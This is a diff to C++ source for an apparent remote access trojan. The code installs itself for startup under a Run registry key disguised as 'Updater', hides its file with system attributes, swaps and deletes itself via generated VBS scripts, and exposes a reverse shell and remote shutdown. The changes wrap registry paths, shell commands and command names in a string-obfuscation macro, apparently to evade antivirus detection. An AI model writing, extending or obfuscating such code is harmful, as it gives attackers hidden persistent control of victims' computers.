@@ -22,10 +22,10 @@ short InstallClient()
 	if (PathToCopy.find("<User>") != string::npos)
 		PathToCopy.replace(PathToCopy.find("<"), PathToCopy.find(">") + 1 - PathToCopy.find("<"), su.GetCurrentUser());
 
-	ru.RegDelValue("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Updater");
+	ru.RegDelValue(AY_OBFUSCATE("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), "Updater");
 
 	if (sett.RegStartup)
-		if (!ru.RegWrite("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Updater", REG_SZ, ("\"" + PathToCopy + "\"").c_str()))
+		if (!ru.RegWrite(AY_OBFUSCATE("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), "Updater", REG_SZ, ("\"" + PathToCopy + "\"").c_str()))
 			return 2;
 
 	//msgb.Ok(PathToCopy);
@@ -94,11 +94,11 @@ bool UpdateClient(SOCKET Sock)
 		return false;
 
 	if (NewClient.j["Hidden"])
-		su.NoOutputCMD("attrib +h \"" + du.GetModuleFilePath() + "VXBkYXRl\\" + du.GetModuleFile() + "\"");
+		su.NoOutputCMD((string)AY_OBFUSCATE("attrib +h \"") + du.GetModuleFilePath() + "VXBkYXRl\\" + du.GetModuleFile() + "\"");
 	if (NewClient.j["System"])
-		su.NoOutputCMD("attrib +s \"" + du.GetModuleFilePath() + "VXBkYXRl\\" + du.GetModuleFile() + "\"");
+		su.NoOutputCMD((string)AY_OBFUSCATE("attrib +s \"") + du.GetModuleFilePath() + "VXBkYXRl\\" + du.GetModuleFile() + "\"");
 
-	if (!du.WriteFile(du.GetModuleFilePath() + "Update.vbs", "WScript.Sleep 5000\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nSet WshShell = WScript.CreateObject(\"WScript.Shell\")\nfilesys.DeleteFile \"" + du.GetFullModuleFilePath() + "\"\nfilesys.MoveFile \"" + du.GetModuleFilePath() + "VXBkYXRl\\" + du.GetModuleFile() + "\", \"" + du.GetFullModuleFilePath() + "\"\nWScript.Sleep 1000\nWshShell.Run \"" + du.GetFullModuleFilePath() + "\", 1, false\nfilesys.DeleteFolder \"" + du.GetModuleFilePath() + "VXBkYXRl\"\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "Update.vbs\""))
+	if (!du.WriteFile(du.GetModuleFilePath() + "Update.vbs", "WScript.Sleep 5000\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nSet WshShell = WScript.CreateObject(\"WScript.Shell\")\nfilesys.DeleteFile \"" + du.GetFullModuleFilePath() + "\"\nfilesys.MoveFile \"" + du.GetModuleFilePath() + "VXBkYXRl\\" + du.GetModuleFile() + "\", \"" + du.GetFullModuleFilePath() + "\"\nWScript.Sleep 1000\nWshShell.Run \"\"\"" + du.GetFullModuleFilePath() + "\"\"\", 1, false\nfilesys.DeleteFolder \"" + du.GetModuleFilePath() + "VXBkYXRl\"\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "Update.vbs\""))
 		return false;
 
 	ru.RegDelKey("SOFTWARE\\Windows Update");
@@ -115,7 +115,7 @@ void Uninstall()
 	SystemUtils su;
 
 	ru.RegDelKey("SOFTWARE\\Windows Update");
-	ru.RegDelValue("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Updater");
+	ru.RegDelValue(AY_OBFUSCATE("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), "Updater");
 
 	du.WriteFile(du.GetModuleFilePath() + "Remove.vbs", "WScript.Sleep 5000\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nfilesys.DeleteFile \"" + du.GetFullModuleFilePath() + "\"\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "Remove.vbs\"");
 	su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Remove.vbs\"");
@@ -234,7 +234,7 @@ void ReverseShell(SOCKET Sock)
 		}
 		else if (ToLowerCase(Cmd) == "exit")
 		{
-			COMUNICAZIONI::ReverseShell(Sock, "Reverse shell closed");
+			COMUNICAZIONI::ReverseShell(Sock, (string)AY_OBFUSCATE("Reverse shell closed"));
 			return;
 		}
 		else if (ToLowerCase(Cmd).substr(0, 7) == "notepad")
@@ -276,12 +276,12 @@ short Sessione(TcpIP Client)
 		}
 		else if (cmd == "shutdown")
 		{
-			su.NoOutputCMD("shutdown -s -t 0");
+			su.NoOutputCMD((string)AY_OBFUSCATE("shutdown -s -t 0"));
 			return 1;
 		}
 		else if (cmd == "reboot")
 		{
-			su.NoOutputCMD("shutdown -r -t 0");
+			su.NoOutputCMD((string)AY_OBFUSCATE("shutdown -r -t 0"));
 			return 1;
 		}
 		else if (cmd == "updateclient")
@@ -299,7 +299,7 @@ short Sessione(TcpIP Client)
 			RestartClient();
 			return 1;
 		}
-		else if (cmd == "reverseshell")
+		else if (cmd == (string)AY_OBFUSCATE("reverseshell"))
 		{
 			ReverseShell(Client.Sock);
 		}
